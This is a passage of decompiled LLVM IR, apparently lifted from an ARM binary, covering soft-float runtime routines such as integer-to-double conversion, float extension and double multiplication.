  %v0_348d4 = load i32, i32* @r1, align 4
  %v3_348d4 = mul i32 %v0_348d4, 2
  %v4_348d4 = zext i1 %v1_348d0 to i32
  %v5_348d4 = or i32 %v3_348d4, %v4_348d4
  %v9_348d4 = icmp ule i32 %v5_348d4, %v0_348d4
  %v10_348d4 = icmp ult i32 %v3_348d4, %v0_348d4
  %v11_348d4 = select i1 %v1_348d0, i1 %v9_348d4, i1 %v10_348d4
  br i1 %v11_348d4, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_348d0
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_348d0, %bb34
  ret i32 %v2_348d0

dec_label_pc_348e4:                               ; preds = %.thread8
  %v2_348e4 = icmp ugt i32 %v0_348c8, -4194305
  br i1 %v2_348e4, label %dec_label_pc_348e4..thread9_crit_edge, label %bb36

dec_label_pc_348e4..thread9_crit_edge:            ; preds = %dec_label_pc_348e4
  %v0_348f0.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_348e4
  %v1_348e8 = load i32, i32* @r1, align 4
  %v2_348e8 = add i32 %v1_348e8, 1048576
  store i32 %v2_348e8, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_348e4..thread9_crit_edge, %bb36
  %v0_348f0 = phi i32 [ %v0_348f0.pre, %dec_label_pc_348e4..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_348f0 = xor i1 %v2_348e4, true
  call void @__pseudo_cond_branch(i1 %v2_348f0, i32 %v0_348f0)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_34924.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_34924.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_34910 = load i32, i32* @r3, align 4
  %v1_34914 = load i32, i32* @r2, align 4
  store i32 %v1_34914, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_3492423 = phi i32 [ %v1_34924.pre, %.thread14 ], [ %v1_34910, %bb37 ]
  %v1_34920 = phi i32 [ %v0_34884, %.thread14 ], [ %v1_34914, %bb37 ]
  store i32 %v1_34920, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_34930 = phi i32 [ %v1_3492423, %bb38 ], [ %v1_34924.pre, %.thread11 ]
  %v1_34938 = phi i32 [ %v1_34920, %bb38 ], [ %v0_34884, %.thread11 ]
  %v4_34924 = mul i32 %v1_34930, 4096
  %v5_34924 = or i32 %v4_34924, %v1_34938
  %v7_34924 = icmp eq i32 %v5_34924, 0
  br i1 %v7_34924, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_34928 = load i32, i32* @r2, align 4
  %v2_34928 = load i32, i32* @r3, align 4
  %v5_34928 = mul i32 %v2_34928, 4096
  %v6_34928 = or i32 %v5_34928, %v1_34928
  %v8_34928 = icmp eq i32 %v6_34928, 0
  br i1 %v8_34928, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_3492c = icmp eq i32 %v2_34928, %v1_34930
  br i1 %v5_3492c, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_34938

; uselistorder directives
  uselistorder i32 %v1_34924.pre, { 0, 2, 1 }
  uselistorder i32 %v0_348d4, { 1, 2, 0 }
  uselistorder i32 %v2_348d0, { 1, 0 }
  uselistorder i1 %v1_348d0, { 1, 0 }
  uselistorder i32 %v0_348c8, { 1, 0 }
  uselistorder i1 %v4_348b4, { 1, 0 }
  uselistorder i32 %v0_34888, { 2, 0, 1 }
  uselistorder i32 %v0_34884, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_348a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_3493c = icmp eq i32 %arg1, 0
  br i1 %v2_3493c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_34944 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_3493c, i32 %v0_34944)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_3495c = call i32 @function_3477c()
  ret i32 %v0_3495c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_34960 = icmp eq i32 %arg1, 0
  br i1 %v2_34960, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_34968 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_34960, i32 %v0_34968)
  store i32 1074, i32* @r4, align 4
  %v1_34978 = and i32 %arg1, -2147483648
  store i32 %v1_34978, i32* @r5, align 4
  %v2_34978 = icmp eq i32 %v1_34978, 0
  br i1 %v2_34978, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_3497c = sub i32 0, %arg1
  store i32 %v2_3497c, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_34984 = call i32 @function_3477c()
  ret i32 %v0_34984

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_34988 = mul i32 %arg1, 2
  store i32 %v2_34988, i32* %r2.global-to-local, align 4
  %v4_34988 = icmp eq i32 %v2_34988, 0
  %v1_3498c = and i32 %v2_34988, 4
  %v2_3498c = icmp ne i32 %v1_3498c, 0
  %v3_3498c = sdiv i32 %v2_34988, 8
  %v3_34990 = zext i1 %v2_3498c to i32
  %v6_34990 = zext i32 %v3_3498c to i64
  %v7_34990 = sub nsw i32 33, %v3_3498c
  %v8_34990 = zext i32 %v7_34990 to i64
  %v9_34990 = shl i64 %v6_34990, %v8_34990
  %v10_34990 = sub nsw i32 32, %v3_3498c
  %v11_34990 = shl i32 %v3_34990, %v10_34990
  %v12_34990 = zext i32 %v11_34990 to i64
  %v14_34990 = or i64 %v12_34990, %v9_34990
  %v15_34990 = trunc i64 %v14_34990 to i32
  store i32 %v15_34990, i32* %r1.global-to-local, align 4
  %v3_34994 = mul i32 %arg1, 536870912
  store i32 %v3_34994, i32* @r0, align 4
  br i1 %v4_34988, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_34998 = and i32 %v2_34988, -16777216
  store i32 %v2_34998, i32* @r3, align 4
  %v4_34998 = icmp eq i32 %v2_34998, 0
  br i1 %v4_34998, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_3499c = icmp ugt i32 %v2_34988, -16777217
  br i1 %v4_3499c, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_349a0 = xor i32 %v15_34990, 939524096
  store i32 %v2_349a0, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_349a4 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_349a4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_349a4, i32 %v0_349a4)
  %v0_349a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_349a8 = icmp eq i32 %v0_349a8, 0
  br i1 %v2_349a8, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_349ac = load i32, i32* @r3, align 4
  %v4_349ac = icmp eq i32 %v1_349ac, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_349b0 = phi i1 [ true, %.thread1 ], [ %v4_349ac, %bb9 ]
  %v0_349b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_349b0, i32 %v0_349b0)
  store i32 896, i32* @r4, align 4
  %v0_349bc = load i32, i32* %r1.global-to-local, align 4
  %v1_349bc = and i32 %v0_349bc, -2147483648
  store i32 %v1_349bc, i32* @r5, align 4
  %tmp = bitcast i32 %v0_349bc to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_349c0 = bitcast float %tmp11 to i32
  store i32 %v1_349c0, i32* @r1, align 4
  %v0_349c4 = call i32 @function_3477c()
  ret i32 %v0_349c4

; uselistorder directives
  uselistorder i32 %v3_3498c, { 1, 2, 0 }
  uselistorder i32 %v2_34988, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_3477c, { 2, 1, 0 }
  uselistorder i32 -16777216, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_349c8 = or i32 %arg2, %arg1
  %v4_349c8 = icmp eq i32 %v2_349c8, 0
  %v0_349cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_349c8, i32 %v0_349cc)
  store i32 0, i32* @r5, align 4
  %v0_349d8 = call i32 @function_349f8()
  ret i32 %v0_349d8
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_349dc = or i32 %arg2, %arg1
  %v4_349dc = icmp eq i32 %v2_349dc, 0
  %v0_349e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_349dc, i32 %v0_349e0)
  %v1_349ec = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_349ec, i32 ptrtoint (i32* @global_var_349f8.2238 to i32))
  %v1_349f0 = sub i32 0, %arg1
  ret i32 %v1_349f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_349f8() local_unnamed_addr {
dec_label_pc_349f8:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_34a00 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_34a00, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_3471c.2236 to i32))
  %tmp6 = icmp ult i32 %v0_34a00, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_349f8
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_349f8, %bb
  %v1_34a18 = phi i32 [ 3, %dec_label_pc_349f8 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_34a00, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_34a18 = add nuw nsw i32 %v1_34a18, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_34a1c = phi i32 [ %v1_34a18, %bb3 ], [ %v2_34a18, %bb4 ]
  %not. = icmp slt i32 %v0_34a00, 0
  %v4_34a1c = zext i1 %not. to i32
  %v5_34a1c = add nsw i32 %v0_34a1c, %v4_34a1c
  %v1_34a20 = sub nsw i32 32, %v5_34a1c
  %v0_34a24 = load i32, i32* @r0, align 4
  %v6_34a24 = shl i32 %v0_34a24, %v1_34a20
  store i32 %v6_34a24, i32* @ip, align 4
  %v6_34a28 = lshr i32 %v0_34a24, %v5_34a1c
  %v1_34a2c = load i32, i32* @r1, align 4
  %v7_34a2c = shl i32 %v1_34a2c, %v1_34a20
  %v8_34a2c = or i32 %v7_34a2c, %v6_34a28
  %v6_34a30 = lshr i32 %v1_34a2c, %v5_34a1c
  %v0_34a34 = load i32, i32* %r4.global-to-local, align 4
  %v2_34a34 = add i32 %v0_34a34, %v5_34a1c
  store i32 %v2_34a34, i32* @r4, align 4
  %v4_34a38 = sext i32 %v8_34a2c to i64
  %v5_34a38 = call i32 @function_3471c(i64 %v4_34a38, i32 %v6_34a30, i32 %v5_34a1c, i32 %v1_34a20)
  ret i32 %v5_34a38

; uselistorder directives
  uselistorder i32 %v5_34a1c, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 8, 31, 3, 0, 52, 53, 9, 29, 7, 10, 32, 56, 57, 11, 12, 59, 54, 55, 33, 34, 6, 30, 5, 1, 13, 58, 4, 2, 14, 35, 15, 36, 16, 17, 27, 18, 28, 19, 20, 21, 22, 37, 38, 39, 40, 23, 41, 42, 24, 43, 44, 45, 46, 47, 25, 48, 26, 49, 50, 51 }
  uselistorder i32 3, { 116, 17, 99, 117, 118, 119, 147, 148, 149, 36, 159, 160, 121, 161, 0, 120, 150, 10, 151, 11, 12, 1, 2, 134, 162, 3, 4, 100, 101, 169, 102, 103, 104, 105, 106, 107, 163, 7, 37, 165, 38, 39, 40, 140, 41, 141, 42, 142, 43, 143, 44, 144, 111, 8, 122, 108, 170, 18, 172, 33, 167, 32, 168, 19, 152, 20, 123, 29, 124, 125, 34, 132, 35, 153, 9, 112, 113, 114, 115, 13, 154, 14, 15, 16, 166, 5, 155, 164, 109, 171, 110, 156, 157, 158, 45, 21, 126, 22, 23, 127, 128, 24, 129, 25, 130, 26, 46, 27, 47, 48, 131, 49, 30, 50, 51, 52, 55, 54, 53, 97, 58, 57, 56, 98, 59, 60, 61, 62, 63, 64, 65, 66, 6, 67, 133, 68, 69, 70, 71, 72, 73, 135, 74, 75, 76, 136, 77, 78, 79, 80, 81, 82, 83, 137, 84, 85, 31, 86, 87, 88, 138, 89, 90, 91, 139, 92, 93, 94, 145, 95, 28, 146, 96 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_34a3c = load i32, i32* @r4, align 4
  store i32 %v3_34a3c, i32* %stack_var_-16, align 4
  %v12_34a3c = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_34a48 = udiv i32 %arg2, 1048576
  %v5_34a48 = urem i32 %v4_34a48, 2048
  store i32 %v5_34a48, i32* %r4.global-to-local, align 4
  %v6_34a48 = icmp eq i32 %v5_34a48, 0
  br i1 %v6_34a48, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_34a4c = udiv i32 %arg4, 1048576
  %v6_34a4c = urem i32 %v5_34a4c, 2048
  store i32 %v6_34a4c, i32* @r5, align 4
  %v7_34a4c = icmp eq i32 %v6_34a4c, 0
  br i1 %v7_34a4c, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_34a50 = icmp eq i32 %v5_34a48, 2047
  br i1 %v5_34a50, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_34a54 = icmp eq i32 %v6_34a4c, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_34a58 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_34a54, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_34a5c.2241 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_34a58, i32 ptrtoint (i32* @global_var_34c34.2239 to i32))
  %v0_34a5c = load i32, i32* %r4.global-to-local, align 4
  %v1_34a5c = load i32, i32* @r5, align 4
  %v2_34a5c = add i32 %v1_34a5c, %v0_34a5c
  store i32 %v2_34a5c, i32* %r4.global-to-local, align 4
  %v2_34a60 = xor i32 %arg4, %arg2
  %v1_34a64 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_34a64, -2097152
  %v5_34a64 = add i32 %tmp51, -1
  %v6_34a64 = and i32 %v5_34a64, %arg2
  store i32 %v6_34a64, i32* %r1.global-to-local, align 4
  %v6_34a68 = and i32 %v5_34a64, %arg4
  %v5_34a6c = mul i32 %arg2, 4096
  %v6_34a6c = or i32 %v5_34a6c, %tmp32
  %v8_34a6c = icmp eq i32 %v6_34a6c, 0
  br i1 %v8_34a6c, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_34a745 = or i32 %v6_34a64, 1048576
  store i32 %v1_34a745, i32* %r1.global-to-local, align 4
  %v1_34a787 = or i32 %v6_34a68, 1048576
  br label %dec_label_pc_34af8

bb40:                                             ; preds = %.thread2
  %v6_34a70 = mul i32 %arg4, 4096
  %v7_34a70 = or i32 %v6_34a70, %arg3
  %v9_34a70 = icmp eq i32 %v7_34a70, 0
  %v1_34a74 = or i32 %v6_34a64, 1048576
  store i32 %v1_34a74, i32* %r1.global-to-local, align 4
  %v1_34a78 = or i32 %v6_34a68, 1048576
  br i1 %v9_34a70, label %dec_label_pc_34af8, label %dec_label_pc_34a80

dec_label_pc_34a80:                               ; preds = %bb40
  %v6_34a80 = mul nuw i64 %tmp, %arg1
  %v7_34a80 = udiv i64 %v6_34a80, 4294967296
  %v9_34a80 = trunc i64 %v6_34a80 to i32
  store i32 %v9_34a80, i32* %ip.global-to-local, align 4
  %v7_34a88 = zext i32 %v1_34a74 to i64
  %v11_34a88 = mul nuw nsw i64 %v7_34a88, %tmp
  %v12_34a88 = add i64 %v11_34a88, %v7_34a80
  %v1_34a8c = and i32 %v2_34a60, -2147483648
  %v10_34a90 = zext i32 %v1_34a78 to i64
  %v11_34a90 = mul nuw i64 %v10_34a90, %arg1
  %v12_34a90 = add i64 %v12_34a88, %v11_34a90
  %v13_34a90 = udiv i64 %v12_34a90, 4294967296
  %v15_34a90 = trunc i64 %v12_34a90 to i32
  %v10_34a98 = mul nuw i64 %v10_34a90, %v7_34a88
  %v11_34a98 = add i64 %v13_34a90, %v10_34a98
  %v12_34a98 = udiv i64 %v11_34a98, 4294967296
  %v13_34a98 = trunc i64 %v12_34a98 to i32
  %v14_34a98 = trunc i64 %v11_34a98 to i32
  %v2_34a9c = icmp eq i32 %v9_34a80, 0
  br i1 %v2_34a9c, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_34a80
  %v2_34aa0 = or i32 %v15_34a90, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_34a80, %bb41
  %storemerge = phi i32 [ %v2_34aa0, %bb41 ], [ %v15_34a90, %dec_label_pc_34a80 ]
  %v0_34ab4 = phi i32 [ %v2_34aa0, %bb41 ], [ %v15_34a90, %dec_label_pc_34a80 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_34aa4 = add i32 %v2_34a5c, -255
  %v2_34aa8 = icmp ugt i32 %v13_34a98, 511
  %v2_34aac = icmp eq i1 %v2_34aa8, false
  %v3_34aac = add i32 %v2_34a5c, -1023
  %v5_34aac = sext i1 %v2_34aac to i32
  %v6_34aac = add i32 %v3_34aac, %v5_34aac
  store i32 %v6_34aac, i32* %r4.global-to-local, align 4
  %v3_34ab0 = icmp ugt i32 %v1_34aa4, 768
  br i1 %v3_34ab0, label %dec_label_pc_34ac0, label %dec_label_pc_34ab4

dec_label_pc_34ab4:                               ; preds = %bb42
  %v1_34ab4 = icmp slt i32 %v0_34ab4, 0
  %v2_34ab4 = mul i32 %v0_34ab4, 2
  store i32 %v2_34ab4, i32* %lr.global-to-local, align 4
  %v3_34ab8 = mul i32 %v14_34a98, 2
  %v4_34ab8 = zext i1 %v1_34ab4 to i32
  %v5_34ab8 = or i32 %v4_34ab8, %v3_34ab8
  %v9_34ab8 = icmp ule i32 %v5_34ab8, %v14_34a98
  %v10_34ab8 = icmp ult i32 %v3_34ab8, %v14_34a98
  %v11_34ab8 = select i1 %v1_34ab4, i1 %v9_34ab8, i1 %v10_34ab8
  %v3_34abc25 = mul nuw nsw i64 %v12_34a98, 2
  %v3_34abc = trunc i64 %v3_34abc25 to i32
  %v4_34abc = zext i1 %v11_34ab8 to i32
  %v5_34abc = or i32 %v4_34abc, %v3_34abc
  br label %dec_label_pc_34ac0

dec_label_pc_34ac0:                               ; preds = %bb42, %dec_label_pc_34ab4
  %v0_34ad0 = phi i32 [ %v0_34ab4, %bb42 ], [ %v2_34ab4, %dec_label_pc_34ab4 ]
  %v0_34ac8 = phi i32 [ %v14_34a98, %bb42 ], [ %v5_34ab8, %dec_label_pc_34ab4 ]
  %v1_34ac0 = phi i32 [ %v13_34a98, %bb42 ], [ %v5_34abc, %dec_label_pc_34ab4 ]
  %v4_34ac0 = mul i32 %v1_34ac0, 2048
  %v4_34ac4 = udiv i32 %v0_34ac8, 2097152
  %v5_34ac0 = or i32 %v4_34ac4, %v1_34a8c
  %v5_34ac4 = or i32 %v5_34ac0, %v4_34ac0
  store i32 %v5_34ac4, i32* %r1.global-to-local, align 4
  %v3_34ac8 = mul i32 %v0_34ac8, 2048
  %v4_34acc = udiv i32 %v0_34ad0, 2097152
  %v5_34acc = or i32 %v3_34ac8, %v4_34acc
  store i32 %v5_34acc, i32* %r0.global-to-local, align 4
  %v3_34ad0 = mul i32 %v0_34ad0, 2048
  store i32 %v3_34ad0, i32* %lr.global-to-local, align 4
  %v1_34ad4 = add i32 %v6_34aac, -253
  store i32 %v1_34ad4, i32* %ip.global-to-local, align 4
  %v2_34ad4 = icmp ugt i32 %v6_34aac, 252
  %v7_34ad4 = icmp eq i32 %v6_34aac, 253
  %v2_34ad8 = xor i1 %v7_34ad4, true
  %v3_34ad8 = and i1 %v2_34ad4, %v2_34ad8
  br i1 %v3_34ad8, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_34ac0
  %v6_34ad8 = icmp ugt i32 %v1_34ad4, 1791
  %v11_34ad8 = icmp eq i32 %v1_34ad4, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_34ac0, %bb43
  %v1_34adc = phi i1 [ %v7_34ad4, %dec_label_pc_34ac0 ], [ %v11_34ad8, %bb43 ]
  %v0_34adc = phi i1 [ %v2_34ad4, %dec_label_pc_34ac0 ], [ %v6_34ad8, %bb43 ]
  %v2_34adc = xor i1 %v1_34adc, true
  %v3_34adc = and i1 %v0_34adc, %v2_34adc
  call void @__pseudo_cond_branch(i1 %v3_34adc, i32 ptrtoint (i32* @global_var_34b28.2240 to i32))
  %v0_34ae0 = load i32, i32* %lr.global-to-local, align 4
  %v2_34ae0 = icmp slt i32 %v0_34ae0, 0
  %v6_34ae0 = icmp eq i32 %v0_34ae0, -2147483648
  %v1_34ae4 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_34ae0, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_34ae4 = urem i32 %v1_34ae4, 2
  %v3_34ae4 = icmp ne i32 %v2_34ae4, 0
  %v4_34ae4 = udiv i32 %v1_34ae4, 2
  store i32 %v4_34ae4, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_34ae8 = phi i1 [ %v3_34ae4, %bb45 ], [ %v2_34ae0, %bb44 ]
  %v2_34ae8 = zext i1 %v1_34ae8 to i32
  %v3_34ae8 = add i32 %v2_34ae8, %v1_34ae4
  store i32 %v3_34ae8, i32* %r0.global-to-local, align 4
  %v0_34aec = load i32, i32* %r1.global-to-local, align 4
  %v1_34aec = load i32, i32* %r4.global-to-local, align 4
  %v2_34aec = and i32 %v1_34aec, 4096
  %v3_34aec = icmp ne i32 %v2_34aec, 0
  %v4_34aec = mul i32 %v1_34aec, 1048576
  %v6_34aec = add i32 %v4_34aec, %v0_34aec
  %v7_34aec = zext i1 %v3_34aec to i32
  %v8_34aec = add i32 %v7_34aec, %v6_34aec
  store i32 %v8_34aec, i32* %r1.global-to-local, align 4
  %v2_34af0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_34af0, i32* %r4.global-to-local, align 4
  store i32 %v12_34a3c, i32* %lr.global-to-local, align 4
  ret i32 %v3_34ae8

dec_label_pc_34af8:                               ; preds = %.thread3, %bb40
  %v1_34b04 = phi i32 [ %v1_34a787, %.thread3 ], [ %v1_34a78, %bb40 ]
  %v1_34afc = phi i32 [ %v1_34a745, %.thread3 ], [ %v1_34a74, %bb40 ]
  %v1_34af8 = and i32 %v2_34a60, -2147483648
  %v2_34afc = or i32 %v1_34afc, %v1_34af8
  %v4_34b001 = or i64 %tmp, %arg1
  %v4_34b00 = trunc i64 %v4_34b001 to i32
  store i32 %v4_34b00, i32* %r0.global-to-local, align 4
  %v2_34b04 = xor i32 %v2_34afc, %v1_34b04
  store i32 %v2_34b04, i32* %r1.global-to-local, align 4
  %v4_34b08 = udiv i32 %v1_34a64, 2
  %v5_34b08 = sub i32 %v2_34a5c, %v4_34b08
  store i32 %v5_34b08, i32* %r4.global-to-local, align 4
  %v7_34b08 = sub i32 0, %v5_34b08
  %v8_34b08 = and i32 %v2_34a5c, %v7_34b08
  %v11_34b08 = icmp eq i32 %v2_34a5c, %v4_34b08
  %v7_34b0c = icmp sgt i32 %v2_34a5c, %v4_34b08
  br i1 %v7_34b0c, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_34af8
  %v10_34b0c = sub i32 %v1_34a64, %v5_34b08
  %v12_34b0c = xor i32 %v5_34b08, %v1_34a64
  %v13_34b0c = xor i32 %v10_34b0c, %v1_34a64
  %v14_34b0c = and i32 %v13_34b0c, %v12_34b0c
  %v17_34b0c = icmp eq i32 %v1_34a64, %v5_34b08
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_34af8, %bb46
  %v3_34b18.in = phi i32 [ %v8_34b08, %dec_label_pc_34af8 ], [ %v14_34b0c, %bb46 ]
  %v2_34b18.in = phi i32 [ %v5_34b08, %dec_label_pc_34af8 ], [ %v10_34b0c, %bb46 ]
  %v1_34b18 = phi i1 [ %v11_34b08, %dec_label_pc_34af8 ], [ %v17_34b0c, %bb46 ]
  %v2_34b18 = icmp slt i32 %v2_34b18.in, 0
  %v3_34b18 = icmp slt i32 %v3_34b18.in, 0
  %v3_34b10 = xor i1 %v3_34b18, %v2_34b18
  %v4_34b10 = or i1 %v1_34b18, %v3_34b10
  br i1 %v4_34b10, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_34b18.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_34b1030 = mul i32 %v5_34b08, 1048576
  %v10_34b1031 = or i32 %v2_34b04, %v9_34b1030
  store i32 %v10_34b1031, i32* %r1.global-to-local, align 4
  %v7_34b14 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_34b14, i32* %r4.global-to-local, align 4
  store i32 %v12_34a3c, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_34b18 = phi i32 [ %v0_34b18.pre, %._crit_edge23 ], [ %v12_34a3c, %bb48 ]
  %v6_34b18 = xor i1 %v4_34b10, true
  call void @__pseudo_cond_branch(i1 %v6_34b18, i32 %v0_34b18)
  %v0_34b1c = load i32, i32* %r1.global-to-local, align 4
  %v1_34b1c = or i32 %v0_34b1c, 1048576
  store i32 %v1_34b1c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_34b24 = load i32, i32* %r4.global-to-local, align 4
  %v1_34b24 = add i32 %v0_34b24, -1
  store i32 %v1_34b24, i32* %r4.global-to-local, align 4
  ret i32 %v4_34b00

; uselistorder directives
  uselistorder i32 %v5_34b08, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_34b08, { 2, 1, 0 }
  uselistorder i32 %v1_34ae4, { 2, 0, 1 }
  uselistorder i32 %v0_34ae0, { 1, 0 }
  uselistorder i1 %v7_34ad4, { 1, 0 }
  uselistorder i32 %v2_34ab4, { 1, 0 }
  uselistorder i1 %v1_34ab4, { 1, 0 }
  uselistorder i32 %v6_34aac, { 0, 2, 1, 3 }
  uselistorder i32 %v0_34ab4, { 1, 0, 2 }
  uselistorder i32 %v14_34a98, { 1, 3, 2, 0 }
  uselistorder i64 %v11_34a98, { 1, 0 }
  uselistorder i64 %v12_34a90, { 1, 0 }
  uselistorder i64 %v10_34a90, { 1, 0 }
  uselistorder i64 %v7_34a88, { 1, 0 }
  uselistorder i64 %v6_34a80, { 1, 0 }
  uselistorder i32 %v6_34a68, { 1, 0 }
  uselistorder i32 %v6_34a64, { 1, 0, 2 }
  uselistorder i32 %v1_34a64, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_34a5c, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_34a4c, { 2, 1, 0 }
